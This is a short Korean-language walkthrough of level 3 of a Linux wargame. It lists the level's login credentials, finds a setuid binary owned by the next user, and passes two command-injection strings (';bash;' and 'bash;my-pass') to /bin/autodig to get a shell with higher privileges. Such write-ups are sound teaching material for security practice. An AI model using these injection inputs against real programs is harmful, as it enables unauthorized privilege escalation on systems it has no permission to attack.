# level 3

* id : `level3`
* pw : `can you fly?`

![](./img/2021-11-05-16-42-07.png)

```
find / -user level4
```

![](./img/2021-11-05-16-43-30.png)
![](./img/2021-11-05-16-44-59.png)
역시나 `/bin/autodig`가 있다.

리눅스에서 명령어는 C언어처럼 `;`로 끝난다.

해당 소스를 보면 간단하게 문자열을 더해서 고대로 쉘처럼 실행하는 프로그램이므로

`;`를 이용해 뒤에 bash 쉘을 추가로 실행하게끔 하면 된다.

```
/bin/autodig ";bash;"
```

![](./img/2021-11-05-16-47-20.png)

물론 다른방법도 있다. 

```
/bin/autodig "bash;my-pass"
```

![](./img/2021-11-05-16-48-31.png)